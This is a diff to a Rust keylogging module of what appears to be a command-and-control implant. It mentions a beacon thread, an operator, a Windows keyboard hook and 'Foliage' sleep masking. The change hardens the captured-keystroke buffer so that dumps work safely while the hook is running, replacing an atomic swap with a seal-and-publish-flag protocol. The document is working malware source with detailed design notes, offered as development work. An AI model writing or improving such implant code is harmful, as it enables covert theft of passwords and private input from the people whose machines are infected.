@@ -33,12 +33,12 @@
 //!
 //! ## Buffer model
 //!
-//! `BUF` is a fixed 4096-byte array; `BUF_LEN` (AtomicUsize) is both the write
-//! head and the live length. [`poll_once`] appends newly-pressed printable keys
-//! without allocating. When the buffer is full, new keys are dropped (oldest
-//! data preserved) — documented rather than silently wrapped. [`do_keylog`]
-//! action=2 atomically claims `[0..len]` via `BUF_LEN.swap(0, AcqRel)`, copies
-//! it into a `Vec`, returns it as `Response::Output`.
+//! `BUF` is a fixed 4096-byte array; `BUF_LEN` (AtomicUsize) is the write head
+//! (and the live length between dumps). [`poll_once`] appends newly-pressed
+//! printable keys without allocating. When the buffer is full, new keys are
+//! dropped (oldest data preserved) — documented rather than silently wrapped.
+//! [`do_keylog`] action=2 drains the buffer into a `Vec` and returns it as
+//! `Response::Output` (see the dump discipline below).
 //!
 //! ## Threading & concurrency (CRITICAL-12)
 //!
@@ -53,12 +53,28 @@
 //!
 //! To eliminate the narrow TOCTOU window (polling path reads the flag false,
 //! then the hook thread sets it and writes), BOTH writers reserve their byte
-//! index via a lock-free `compare_exchange` on `BUF_LEN`. This gives
-//! single-writer-per-byte semantics: each index is uniquely owned by exactly
-//! one thread, so no two writes ever target the same byte. The protocol is
-//! no_std-safe (pure atomics), cannot deadlock if a writer faults mid-write
-//! (the next writer's CAS simply fails and retries/drops), and preserves the
-//! drop-newest-when-full contract. Ordering is Acquire/Release throughout.
+//! index via a lock-free `compare_exchange` on `BUF_LEN`, store the byte, and
+//! then publish it with a Release store to `BUF_READY[i]`. This is the
+//! **single-writer-per-byte invariant**: each index is uniquely owned by
+//! exactly one thread, so no two writes ever target the same byte, and a
+//! reader only ever observes bytes whose owning writer has finished. The
+//! protocol is no_std-safe (pure atomics), cannot deadlock if a writer faults
+//! mid-write (the next writer's CAS simply fails and retries/drops), and
+//! preserves the drop-newest-when-full contract. Ordering is Acquire/Release
+//! throughout.
+//!
+//! **Dump discipline (`do_keylog(2)`).** A dump must never read a
+//! reserved-but-unwritten slot: a writer that has claimed index `i` (CAS
+//! success) may not yet have stored `BUF[i]`, so draining up to the raw claim
+//! head would report stale bytes as fresh keystrokes — and unconditionally
+//! resetting the head could hand a re-claimed index to a new writer while the
+//! original owner is still mid-write (two writers, same byte). The dump
+//! therefore takes the same CAS discipline as the writers: it *seals* the
+//! claim head (`compare_exchange(head, BUF_CAP)`), waits until every claimed
+//! index is published (`BUF_READY[i] == true`), copies `[0..head)`, clears the
+//! publish flags, and only then reopens the head to 0. Keystrokes landing in
+//! the (microsecond) drain window are dropped, exactly like the buffer-full
+//! case. Details in [`do_keylog`].
 //!
 //! `static mut LAST` / `BUF` are touched only inside `unsafe` blocks via raw
 //! pointers (`addr_of_mut!`) to avoid the `static_mut_refs` lint under edition
@@ -117,6 +133,16 @@ const BUF_CAP: usize = 4096;
 /// Live byte count in `BUF` (also the next write index). Atomic only for static
 /// hygiene; the single beacon thread is the sole reader/writer.
 static BUF_LEN: AtomicUsize = AtomicUsize::new(0);
+
+/// Per-slot "byte fully written" publish flag (CRITICAL-12).
+///
+/// A writer sets `BUF_READY[i]` with Release AFTER storing `BUF[i]`; the dump
+/// (and only the dump) reads it with Acquire to learn which claimed indices are
+/// safe to copy, and clears it after draining. `false` means either the slot
+/// was never claimed this epoch or it is claimed-but-not-yet-written — a dump
+/// MUST NOT read such a slot. The Release store pairs with the dump's Acquire
+/// load, so an observed `true` guarantees the byte store is visible.
+static BUF_READY: [AtomicBool; BUF_CAP] = [const { AtomicBool::new(false) }; BUF_CAP];
 
 // ---- helpers ---------------------------------------------------------------
 
@@ -276,7 +302,9 @@ fn get_key_state_fn() -> Option<unsafe extern "system" fn(i32) -> i16> {
 // writes captured keys into the shared `BUF` (same ring the polling path uses,
 // with Acquire/Release ordering now that there's a real concurrent writer).
 // `do_keylog(1)` posts `WM_QUIT` to the thread's message pump, joins it, and
-// unhooks. `do_keylog(2)` (dump) is unchanged.
+// unhooks. `do_keylog(2)` (dump) is safe to run while the hook thread is live:
+// it seals the claim head, waits for every in-flight writer to publish its
+// byte, copies, and reopens — see the dump discipline in the module docs.
 //
 // Foliage interaction: while the hook thread is live, `sleep.rs`'s Foliage
 // mask path checks [`hook_is_active`] and degrades to the data-only floor —
@@ -627,7 +655,8 @@ unsafe fn translate_vk_for_hook(vk: i32) -> Option<u8> {
 /// race on the old load-store sequence is eliminated. The protocol is
 /// no_std-safe (pure atomics), cannot deadlock if a writer faults mid-write
 /// (the next writer's CAS simply fails and retries/drops), and pairs with the
-/// `swap(0, AcqRel)` drain in `do_keylog(2)`.
+/// seal/quiesce drain in `do_keylog(2)` (a dump never reads a claimed-but-
+/// unpublished index).
 fn claim_buf_index() -> Option<usize> {
     let mut len = BUF_LEN.load(Ordering::Acquire);
     for _ in 0..4 {
@@ -650,11 +679,15 @@ fn claim_buf_index() -> Option<usize> {
 /// and one byte would be lost (or torn under `panic=abort` + a sanitizer).
 ///
 /// The fix is a lock-free single writer-per-byte protocol built on a
-/// compare-and-swap of `BUF_LEN`:
+/// compare-and-swap of `BUF_LEN` plus a per-slot publish flag:
 ///   1. Atomically reserve an index: `compare_exchange(len, len+1)`. Success
 ///      means THIS thread uniquely owns `BUF[len]`; no other writer can claim
 ///      the same index.
 ///   2. Write the byte at the now-exclusively-owned index.
+///   3. Publish the byte: `BUF_READY[len].store(true, Release)`. Because the
+///      store happens-after the byte store in program order, any Acquire read
+///      of the flag (the dump's quiesce wait) synchronizes with the byte write
+///      and can safely copy it.
 ///
 /// Because each byte index is claimed by exactly one thread, the writes never
 /// overlap and the byte content is unambiguous. The CAS uses Acquire on the
@@ -665,9 +698,9 @@ fn claim_buf_index() -> Option<usize> {
 /// for the next writer, which retries or drops), and preserves the
 /// drop-newest-when-full semantics.
 ///
-/// `do_keylog(2)` dumps `[0..BUF_LEN]`; it reads `BUF_LEN` with Acquire (via
-/// `swap(0, AcqRel)`), which pairs with the AcqRel success store here, so it
-/// only sees fully-reserved indices whose bytes have been written.
+/// `do_keylog(2)` never reads a claimed-but-unpublished index: it seals the
+/// claim head, waits until every claimed index is published (`BUF_READY`),
+/// then copies `[0..head)`. See the dump discipline in the module docs.
 fn buf_push_release(b: u8) {
     // Reserve an index via the shared CAS helper. Retry a bounded number of
     // times on contention (the only contender is the polling path, which is
@@ -683,6 +716,10 @@ fn buf_push_release(b: u8) {
             let ptr: *mut u8 = core::ptr::addr_of_mut!(BUF).cast::<u8>();
             *ptr.add(len) = b;
         }
+        // Publish the byte AFTER the store (Release pairs with the dump's
+        // Acquire quiesce). BUF_READY is an immutable static of atomics, so
+        // this needs no unsafe.
+        BUF_READY[len].store(true, Ordering::Release);
     }
 }
 
@@ -862,6 +899,8 @@ fn buf_push(b: u8) {
             let ptr: *mut u8 = core::ptr::addr_of_mut!(BUF).cast::<u8>();
             *ptr.add(len) = b;
         }
+        // Publish the byte AFTER the store (same protocol as buf_push_release).
+        BUF_READY[len].store(true, Ordering::Release);
     }
 }
 
@@ -1098,37 +1137,83 @@ pub fn do_keylog(action: u8) -> Response {
             Response::Ok
         }
         2 => {
-            // Snapshot length, copy [0..len] into a Vec, then reset. Only this
-            // path allocates; poll_once stays allocation-free.
+            // Drain the captured bytes into a Vec, then reset for the next
+            // capture window. Only this path allocates; poll_once stays
+            // allocation-free.
             //
-            // CRITICAL-12: use `swap(0, AcqRel)` to atomically CLAIM the
-            // readable region AND reset the write head in one step. This pairs
-            // with the CAS-based writers (`buf_push` / `buf_push_release`):
-            //   - A writer that reserved an index < `len` did so with a
-            //     successful CAS whose AcqRel store happens-before this swap's
-            //     Acquire, so its byte write is visible to the copy below.
-            //   - A writer racing this swap either completes its CAS first
-            //     (its index is < `len`, included) or sees the reset and
-            //     claims a fresh index in the new epoch (excluded).
-            //
-            // Residual note: if the hook thread is STILL live when a dump is
-            // requested, its callback may write a byte at an index in
-            // `[0..len)` concurrently with the non-atomic read loop below.
-            // Index ownership is still unique per the CAS, so bytes are never
-            // torn; on x64 byte stores are atomic so the read sees either the
-            // old or the new value. For a fully-sound dump with no concurrent
-            // writer, the operator should stop the hook first (action=1). The
-            // polling-only path (hook never started) is fully sound.
-            let len = BUF_LEN.swap(0, Ordering::AcqRel);
-            let mut out: Vec<u8> = Vec::with_capacity(len);
-            // SAFETY: len <= BUF_CAP (writers never claim past the cap). Read
-            // through a raw pointer to avoid forming a `&static mut`
-            // (static_mut_refs lint).
+            // CRITICAL-12 dump discipline (see module docs): a dump must
+            // NEVER read a reserved-but-unwritten slot. A writer that CAS-
+            // claimed index `i` may not have stored `BUF[i]` yet, and an
+            // unconditional reset of the head could hand a re-claimed index
+            // to a new writer while the original owner is still mid-write
+            // (violating the single-writer-per-byte invariant). The dump
+            // therefore takes the same CAS discipline as the writers:
+            //   1. Seal the claim head (`compare_exchange(head, BUF_CAP)`) so
+            //      no new writer can claim while we drain. Writers racing the
+            //      seal either land their CAS before it (their index is
+            //      included in the frozen region) or fail and drop (buffer
+            //      appears full — documented drop-newest behavior).
+            //   2. Quiesce: wait until every claimed index < head has its
+            //      byte published via `BUF_READY` (Release by the writer
+            //      after its store; Acquire here). The seal guarantees no new
+            //      claims can start, and each in-flight writer publishes
+            //      within a finite number of instructions — panic=abort turns
+            //      a writer fault into process death, so the wait cannot hang.
+            //   3. Copy `[0..head)` — every slot is fully written.
+            //   4. Clear `BUF_READY[0..head)` while the head is still sealed,
+            //      then reopen the head to 0. New-epoch writers re-claim from
+            //      0 only after the reopen, so a fresh publish can never be
+            //      clobbered by a stale clear, and no two writers ever own
+            //      the same byte.
+            let mut head = BUF_LEN.load(Ordering::Acquire);
+            if head != 0 {
+                loop {
+                    match BUF_LEN.compare_exchange(
+                        head,
+                        BUF_CAP,
+                        Ordering::AcqRel,
+                        Ordering::Acquire,
+                    ) {
+                        Ok(_) => break, // sealed at `head`.
+                        Err(actual) => head = actual, // a writer claimed past us; re-seal.
+                    }
+                }
+                // Quiesce: wait for every in-flight writer to publish its byte.
+                loop {
+                    let mut pending = false;
+                    for i in 0..head {
+                        if !BUF_READY[i].load(Ordering::Acquire) {
+                            pending = true;
+                            break;
+                        }
+                    }
+                    if !pending {
+                        break;
+                    }
+                    core::hint::spin_loop();
+                }
+            }
+            let mut out: Vec<u8> = Vec::with_capacity(head);
+            // SAFETY: head <= BUF_CAP (writers never claim past the cap) and
+            // every slot in [0..head) was published by its owning writer
+            // (quiesced above) — this copy never touches a reserved-but-
+            // unwritten byte. Read through a raw pointer to avoid forming a
+            // `&static mut` (static_mut_refs lint).
             unsafe {
                 let ptr: *const u8 = core::ptr::addr_of_mut!(BUF).cast::<u8>();
-                for i in 0..len {
+                for i in 0..head {
                     out.push(*ptr.add(i));
                 }
+            }
+            if head != 0 {
+                // Clear the publish flags for the drained region while the
+                // head is still sealed, then reopen the buffer. No writer can
+                // claim or publish between the clear and the reopen, so a
+                // next-epoch publish can never be clobbered by a stale clear.
+                for i in 0..head {
+                    BUF_READY[i].store(false, Ordering::Relaxed);
+                }
+                BUF_LEN.store(0, Ordering::Release);
             }
             Response::Output(out)
         }
